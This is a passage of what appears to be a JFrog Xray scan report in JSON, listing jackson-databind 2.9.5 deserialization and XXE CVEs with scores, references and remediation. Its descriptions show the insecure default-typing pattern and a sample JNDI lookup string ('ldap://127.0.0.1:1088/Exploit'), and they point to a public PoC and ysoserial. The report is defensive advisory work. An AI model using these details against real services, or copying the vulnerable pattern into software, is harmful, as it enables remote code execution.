                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to br.com.anteros.dbcp.AnterosDBCPConfig (aka anteros-core).",
        "severity": "Critical",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.4]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-95100",
        "references": [
          "https://lists.apache.org/thread.html/rdd4df698d5d8e635144d2994922bf0842e933809eae259521f3b5097@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r98c9b6e4c9e17792e2cd1ec3e4aa20b61a791939046d3f10888176bb@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rdd49ab9565bec436a896bc00c4b9fc9dce1598e106c318524fbdfec6@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r98c9b6e4c9e17792e2cd1ec3e4aa20b61a791939046d3f10888176bb%40%3Cissues.zookeeper.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/issues/2634",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E",
          "https://lists.apache.org/thread.html/r9464a40d25c3ba1a55622db72f113eb494a889656962d098c70c5bb1@%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rd5a4457be4623038c3989294429bc063eec433a2e55995d81591e2ca@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rb6fecb5e96a6d61e175ff49f33f2713798dd05cf03067c169d195596%40%3Cissues.zookeeper.apache.org%3E",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://github.com/FasterXML/jackson-databind/commit/9f4e97019fb0dd836533d0b6198c88787e235ae2",
          "https://lists.apache.org/thread.html/rdd4df698d5d8e635144d2994922bf0842e933809eae259521f3b5097%40%3Cissues.zookeeper.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://lists.apache.org/thread.html/rb6fecb5e96a6d61e175ff49f33f2713798dd05cf03067c169d195596@%3Cissues.zookeeper.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujan2021.html",
          "https://lists.apache.org/thread.html/rdd49ab9565bec436a896bc00c4b9fc9dce1598e106c318524fbdfec6%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r35d30db00440ef63b791c4b7f7acb036e14d4a23afa2a249cb66c0fd%40%3Cissues.zookeeper.apache.org%3E",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://github.com/FasterXML/jackson-databind/commit/1e64db6a2fad331f96c7363fda3bc5f3dffa25bb",
          "https://lists.debian.org/debian-lts-announce/2020/03/msg00008.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-9548",
          "https://lists.apache.org/thread.html/rd5a4457be4623038c3989294429bc063eec433a2e55995d81591e2ca%40%3Cissues.zookeeper.apache.org%3E",
          "https://github.com/advisories/GHSA-p43x-xfjf-5jhr",
          "https://security.netapp.com/advisory/ntap-20200904-0006/",
          "https://security.netapp.com/advisory/ntap-20200904-0006",
          "https://lists.apache.org/thread.html/r9464a40d25c3ba1a55622db72f113eb494a889656962d098c70c5bb1%40%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r35d30db00440ef63b791c4b7f7acb036e14d4a23afa2a249cb66c0fd@%3Cissues.zookeeper.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://www.oracle.com/security-alerts/cpuoct2020.html"
        ],
        "extended_information": {
          "short_description": "A typing issue in anterosdbcp in Jackson-databind allows a remote attacker to perform remote code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the `br.com.anteros.dbcp.AnterosDBCPConfig` gadget in [anterosdbcp]( https://github.com/anterostecnologia/anterosdbcp), the attacker can call `lookup` with an arbitrary location by calling `setHealthCheckRegistry` with an arbitrary argument such as `\"ldap://127.0.0.1:1088/Exploit\"`. This vulnerability allows the attacker to perform remote code execution as demonstrated in this [PoC](https://github.com/fairyming/CVE-2020-9548/blob/master/Poc.java).\n\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes `anterosdbcp` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes `anterosdbcp` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `anterosdbcp` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-14061",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.5 mishandles the interaction between serialization gadgets and typing, related to oracle.jms.AQjmsQueueConnectionFactory, oracle.jms.AQjmsXATopicConnectionFactory, oracle.jms.AQjmsTopicConnectionFactory, oracle.jms.AQjmsXAQueueConnectionFactory, and oracle.jms.AQjmsXAConnectionFactory (aka weblogic/oracle-aqjms).",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.6.7.4]",
              "[2.9.10.5]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-100647",
        "references": [
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://github.com/FasterXML/jackson-databind/issues/2698",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://www.oracle.com/security-alerts/cpujan2021.html",
          "https://github.com/FasterXML/jackson-databind",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://lists.debian.org/debian-lts-announce/2020/07/msg00001.html",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-14061",
          "https://security.netapp.com/advisory/ntap-20200702-0003/",
          "https://github.com/FasterXML/jackson-databind/commit/5c8642aeae9c756b438ab7637c90ef3c77966e6e",
          "https://security.netapp.com/advisory/ntap-20200702-0003",
          "https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-572316"
        ],
        "extended_information": {
          "short_description": "A typing issue in Oracle-aq-jms in Jackson-databind allows a remote attacker to perform code injection.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted]( https://github.com/FasterXML/jackson-databind/blob/2.13/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [Oracle-aq-jms]( https://github.com/daitangio/oracle-aq-jms) gadget, an attacker can pivot JMS to load arbitrary classes by invoking `AQjmsQueueConnectionFactory` class methods and achieving remote code execution.\n\nWhen this library is included, an attacker can build a working exploit, and even automate this process by using [ysoserial]( https://github.com/frohoff/ysoserial), a tool that finds gadgets and create payloads for vulnerable java deserializers.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes Oracle-aq-jms in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes Oracle-aq-jms in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `Oracle-aq-jms` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-36185",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to org.apache.tomcat.dbcp.dbcp2.datasources.SharedPoolDataSource.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.8]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-138356",
        "references": [
          "https://github.com/FasterXML/jackson-databind/commit/567194c53ae91f0a14dc27239afb739b1c10448a",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-36185",
          "https://github.com/advisories/GHSA-8w26-6f25-cm9x",
          "https://lists.debian.org/debian-lts-announce/2021/04/msg00025.html",
          "https://www.oracle.com/security-alerts/cpujan2022.html",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://security.netapp.com/advisory/ntap-20210205-0005/",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://github.com/FasterXML/jackson-databind/issues/2998"
        ],
        "extended_information": {
          "short_description": "A typing issue in Apache Tomcat dbcp2 in Jackson-databind leads to unknown impact.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [Apache Tomcat]( https://github.com/apache/tomcat) dbcp gadget, an attacker can create an arbitrary Pool connection to DB by invoking `testCPDS` in ` org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource`. The impact of creating such a Pool connection is unknown.\n\nWhen this library is included, an attacker can build a working exploit, and even automate this process by using [ysoserial]( https://github.com/frohoff/ysoserial), a tool that finds gadgets and create payloads for vulnerable java deserializers.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes dbcp2 in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes dbcp2 in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue's real-world impact is unspecified and nontrivial to deduce",
              "description": "The gadget's real-world impact is unknown, no substantial impact has been publicly demonstrated",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `dbcp2` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-35490",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to org.apache.commons.dbcp2.datasources.PerUserPoolDataSource.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.8]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-135095",
        "references": [
          "https://security.netapp.com/advisory/ntap-20210122-0005",
          "https://lists.debian.org/debian-lts-announce/2021/04/msg00025.html",
          "https://security.netapp.com/advisory/ntap-20210122-0005/",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-35490",
          "https://www.oracle.com/security-alerts/cpujan2022.html",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://github.com/FasterXML/jackson-databind/issues/2986",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://github.com/FasterXML/jackson-databind/commit/41b8bdb5ccc1d8edb71acf1c8234da235a24249d",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://github.com/advisories/GHSA-wh8g-3j2c-rqj5"
        ],
        "extended_information": {
          "short_description": "A typing issue in dbcp2 in Apache Commons in Jackson-databind leads to unknown impact.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the dbcp2 gadget, an attacker can create an arbitrary `Pool` connection to a DB by invoking `registerPool` which will call `testCPDS` in `org.apache.commons.dbcp.dbcp2.datasources. PerUserPoolDataSource `. The impact from creating an arbitrary Pool connection is unknown.\n\nWhen this library is included, an attacker can build a working exploit, and even automate this process by using [ysoserial]( https://github.com/frohoff/ysoserial), a tool that finds gadgets and create payloads for vulnerable java deserializers.\n\nExploitation requires:\n\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes dbcp2 in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes dbcp2 in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue's real-world impact is unspecified and nontrivial to deduce",
              "description": "The gadget's real-world impact is unknown, no substantial impact has been publicly demonstrated",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `dbcp2` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-25649",
            "cvss_v2_score": "5.0",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:P/A:N",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
            "cwe": [
              "CWE-611"
            ],
            "cwe_details": {
              "CWE-611": {
                "name": "Improper Restriction of XML External Entity Reference",
                "description": "The product processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output."
              }
            }
          }
        ],
        "summary": "A flaw was found in FasterXML Jackson Databind, where it did not have entity expansion secured properly. This flaw allows vulnerability to XML external entity (XXE) attacks. The highest threat from this vulnerability is data integrity.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.10.5.1]",
              "[2.6.7.4]",
              "[2.9.10.7]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-129581",
        "references": [
          "https://lists.apache.org/thread.html/r86c78bf7656fdb2dab69cbf17f3d7492300f771025f1a3a65d5e5ce5%40%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r6a6df5647583541e3cb71c75141008802f7025cee1c430d4ed78f4cc%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/rdf9a34726482222c90d50ae1b9847881de67dde8cfde4999633d2cdc%40%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r6e3d4f7991542119a4ca6330271d7fbf7b9fb3abab24ada82ddf1ee4%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r3e6ae311842de4e64c5d560a475b7f9cc7e0a9a8649363c6cf7537eb@%3Ccommits.karaf.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6X2UT4X6M7DLQYBOOHMXBWGYJ65RL2CT",
          "https://lists.apache.org/thread.html/r78d53a0a269c18394daf5940105dc8c7f9a2399503c2e78be20abe7e@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rbf4ce74b0d1fa9810dec50ba3ace0caeea677af7c27a97111c06ccb7%40%3Cdev.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rbf4ce74b0d1fa9810dec50ba3ace0caeea677af7c27a97111c06ccb7%40%3Cusers.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r94c7e86e546120f157264ba5ba61fd29b3a8d530ed325a9b4fa334d7%40%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6X2UT4X6M7DLQYBOOHMXBWGYJ65RL2CT/",
          "https://lists.apache.org/thread.html/r2b6ddb3a4f4cd11d8f6305011e1b7438ba813511f2e3ab3180c7ffda@%3Ccommits.druid.apache.org%3E",
          "https://lists.apache.org/thread.html/r8937a7160717fe8b2221767163c4de4f65bc5466405cb1c5310f9080%40%3Cdev.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r6a4f3ef6edfed2e0884269d84798f766779bbbc1005f7884e0800d61%40%3Cdev.knox.apache.org%3E",
          "https://lists.apache.org/thread.html/r45e7350dfc92bb192f3f88e9971c11ab2be0953cc375be3dda5170bd%40%3Cissues.flink.apache.org%3E",
          "https://lists.apache.org/thread.html/rd6f6bf848c2d47fa4a85c27d011d948778b8f7e58ba495968435a0b3@%3Cissues.zookeeper.apache.org%3E",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
